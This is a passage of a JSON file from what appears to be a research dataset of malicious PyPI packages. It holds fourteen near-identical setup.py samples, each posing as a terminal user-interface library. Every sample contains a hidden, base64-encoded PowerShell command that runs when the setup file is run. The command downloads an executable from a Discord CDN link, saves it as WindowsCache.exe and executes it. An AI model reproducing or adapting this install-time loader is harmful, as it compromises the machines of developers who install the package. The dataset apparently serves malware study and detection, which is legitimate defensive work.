        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpcontrolpywreplace',\n    packages = ['modlib'],\n    version = '3.58',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tpcpuintpep-v9.27",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpcpuintpep',\n    packages = ['modlib'],\n    version = '6.61',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tpcpuramhttp-v6.55",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpcpuramhttp',\n    packages = ['modlib'],\n    version = '2.44',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tpcpustrvm-v5.61",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpcpustrvm',\n    packages = ['modlib'],\n    version = '1.6',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tpcraftvisasuper-v9.76",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpcraftvisasuper',\n    packages = ['modlib'],\n    version = '2.17',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tpedpingpull-v8.64",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpedpingpull',\n    packages = ['modlib'],\n    version = '2.91',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tpedramver-v9.57",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpedramver',\n    packages = ['modlib'],\n    version = '3.40',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tpgetadstr-v7.38",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpgetadstr',\n    packages = ['modlib'],\n    version = '2.32',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tpgrandencodegui-v10.39",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpgrandencodegui',\n    packages = ['modlib'],\n    version = '3.74',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tpgrandencodever-v7.82",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpgrandencodever',\n    packages = ['modlib'],\n    version = '10.48',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tpgrandlibload-v1.83",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpgrandlibload',\n    packages = ['modlib'],\n    version = '8.79',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tpguigrandreplace-v5.95",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpguigrandreplace',\n    packages = ['modlib'],\n    version = '4.26',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tpguiintelcv-v1.72",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpguiintelcv',\n    packages = ['modlib'],\n    version = '1.81',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tpguiosintre-v2.49",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpguiosintre',\n    packages = ['modlib'],\n    version = '8.41',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
